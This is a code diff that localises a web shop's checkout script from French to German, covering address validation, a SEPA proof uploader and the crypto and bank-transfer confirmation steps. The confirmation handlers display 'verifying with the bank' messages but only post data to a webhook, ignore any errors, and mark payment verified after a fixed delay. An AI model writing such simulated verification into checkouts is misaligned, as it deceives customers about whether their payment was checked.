+    const copySel=sel=>{const el=$(sel); if(!el) return; const txt=el.value||''; if(navigator.clipboard?.writeText){navigator.clipboard.writeText(txt).then(()=>toast('Kopiert'));} else {el.select(); document.execCommand('copy'); toast('Kopiert');}};
     $$('[data-copy]').forEach(b=>b.addEventListener('click',()=>copySel(b.getAttribute('data-copy'))));
 
-    // Validation adresse
+    // Adress-Validierung
     function validateAddress(){
-      const req=['name','email','address','city','zip'];
-      for(const id of req){ const el=$('#'+id); if(!el || !el.value.trim()){ el?.focus(); toast('Veuillez compléter vos informations.'); return false; } }
+      const req=['name','email','address','city','zip','country'];
+      for(const id of req){
+        const el=$('#'+id);
+        if(!el) continue;
+        const val = (el.tagName==='SELECT') ? el.value : el.value.trim();
+        if(!val){ el?.focus(); toast('Bitte füllen Sie Ihre Angaben aus.'); return false; }
+      }
       return true;
     }
 
-    /* ====== Uploader (SEPA) — version mobile-friendly ====== */
-    const MAX_SIZE = 10 * 1024 * 1024; // 10 Mo
+    /* ====== Uploader (SEPA) ====== */
+    const MAX_SIZE = 10 * 1024 * 1024; // 10 MB
     const dz = document.getElementById('dz');
     const input = document.getElementById('proofInput');
     const fileWrap = document.getElementById('fileWrap');
@@ -817,23 +870,23 @@
     const removeProof = document.getElementById('removeProof');
 
     function fmtBytes(b){
-      if(b===0) return '0 o';
+      if(b===0) return '0 B';
       if(!b && b!==0) return '';
-      const u=['o','Ko','Mo','Go']; let i=0;
+      const u=['B','KB','MB','GB']; let i=0;
       while(b>=1024 && i<u.length-1){ b/=1024; i++; }
       return b.toFixed(b<10&&i?1:0)+' '+u[i];
     }
     function reasonForRefusal(f){
-      if(!f) return 'Aucun fichier détecté.';
-      if(f.size === 0) return 'Fichier vide (0 octet).';
-      if(f.size > MAX_SIZE) return 'Fichier trop volumineux (>10 Mo).';
+      if(!f) return 'Keine Datei erkannt.';
+      if(f.size === 0) return 'Leere Datei (0 Byte).';
+      if(f.size > MAX_SIZE) return 'Datei zu groß (>10 MB).';
       return '';
     }
     let proofFile = null;
     function showFile(f){
       proofFile = f;
-      fileName.textContent = f.name || 'Fichier';
-      fileInfo.textContent = `${f.type || 'Type inconnu'} • ${fmtBytes(f.size)}`;
+      fileName.textContent = f.name || 'Datei';
+      fileInfo.textContent = `${f.type || 'Unbekannter Typ'} • ${fmtBytes(f.size)}`;
       fileBar.style.width = '0%';
       fileOk.style.display = 'none';
       fileWrap.style.display = 'flex';
@@ -853,7 +906,7 @@
     }
     if (removeProof) removeProof.addEventListener('click', clearFile);
 
-    // Drag & Drop (desktop)
+    // Drag & Drop (Desktop)
     if (dz){
       ['dragenter','dragover'].forEach(ev => dz.addEventListener(ev, e => {
         e.preventDefault(); e.stopPropagation();
@@ -876,65 +929,65 @@
         const reason = reasonForRefusal(f);
         if (reason) { toast(reason); return; }
         showFile(f);
-        if (input) input.value = ''; // re-sélection du même fichier possible
+        if (input) input.value = '';
       });
     }
 
-    // Sélection via picker (mobile & desktop)
+    // Dateiauswahl (Mobil & Desktop)
     if (input) input.addEventListener('change', e => {
       const f = e.target.files && e.target.files[0];
       const reason = reasonForRefusal(f);
       if (reason) { toast(reason); input.value=''; return; }
       showFile(f);
-      input.value = ''; // autorise re-select du même fichier
+      input.value = '';
     });
     /* ====== /Uploader ====== */
 
-    // Confirmer crypto
+    // Crypto bestätigen
     document.getElementById('confirmCrypto').addEventListener('click', async ()=>{
       if(!validateAddress()) return;
       const tx = document.getElementById('txid').value.trim();
-      if(!tx){ document.getElementById('txid').focus(); toast('TxID requis.'); return; }
-      showOverlay('Vérification de la transaction crypto…', 'Nous validons le hash fourni.');
+      if(!tx){ document.getElementById('txid').focus(); toast('TxID erforderlich.'); return; }
+      showOverlay('Krypto-Transaktion wird geprüft…', 'Wir validieren den angegebenen Hash.');
       const dueNow = currentDueNow();
       try{ await sendCryptoToWebhook(dueNow); }catch{}
       setTimeout(()=>{
         hideOverlay();
         cryptoVerified=true;
         updateCTA();
-        toast('Transaction enregistrée — vous pouvez finaliser');
+        toast('Transaktion erfasst — Sie können abschließen');
         $('#placeOrder').focus();
       }, 1200);
     });
 
-    // Confirmer SEPA
+    // SEPA bestätigen
     document.getElementById('confirmBank').addEventListener('click', async ()=>{
       if(!validateAddress()) return;
       if(!$('#vref').value.trim()){ syncRef(); }
-      if(!proofFile){ dz.scrollIntoView({behavior:'smooth',block:'center'}); toast('Preuve de virement requise.'); return; }
-      showOverlay('Vérification du virement…', 'Nous confirmons la réception auprès de la banque.');
+      if(!proofFile){ dz.scrollIntoView({behavior:'smooth',block:'center'}); toast('Überweisungsnachweis erforderlich.'); return; }
+      showOverlay('Überweisung wird geprüft…', 'Wir bestätigen den Eingang bei der Bank.');
       const dueNow = currentDueNow();
       try{ await sendSepaToWebhook(dueNow, proofFile); }catch{}
       setTimeout(()=>{
         hideOverlay();
         bankVerified=true;
         updateCTA();
-        toast('Virement enregistré — vous pouvez finaliser');
+        toast('Überweisung erfasst — Sie können abschließen');
         $('#placeOrder').focus();
       }, 1300);
     });
 
-    // Finaliser commande
+    // Bestellung abschließen
     document.getElementById('placeOrder').addEventListener('click', ()=>{
       if(!validateAddress()) return;
-      const cart=getCart(); if(!cart.length){ toast('Votre panier est vide.'); return; }
+      const cart=getCart(); if(!cart.length){ toast('Ihr Warenkorb ist leer.'); return; }
       const pm=currentPM();
-      if(pm==='crypto' && !cryptoVerified){ toast('Veuillez terminer la vérification crypto.'); return; }
-      if(pm==='sepa' && !bankVerified){ toast('Veuillez terminer la vérification du virement.'); return; }
+      if(pm==='crypto' && !cryptoVerified){ toast('Bitte schließen Sie die Krypto-Prüfung ab.'); return; }
+      if(pm==='sepa' && !bankVerified){ toast('Bitte schließen Sie die Überweisungs-Prüfung ab.'); return; }
 
       const sub=computeSub(cart), promo=sub*promoRate(), total=Math.max(0, sub - promo);
       const order={
-        id:orderId, date:new Date().toISOString(), status:'En préparation',
+        id:orderId, date:new Date().toISOString(), status:'In Bearbeitung',
         items:cart, pricing:{sub,ship:0,promo,total,currency:'EUR'},
         shipping:{name:$('#name').value,email:$('#email').value,phone:$('#phone').value,address:$('#address').value,city:$('#city').value,zip:$('#zip').value,country:$('#country').value},
         payment:{
@@ -950,7 +1003,7 @@
       showDone();
     });
 
-    // Fermer modal au clic fond
+    // Modal schließen bei Klick auf Hintergrund
     document.getElementById('splitModal').addEventListener('click',e=>{ if(e.target.id==='splitModal') e.currentTarget.classList.remove('show'); });
 
     // Init
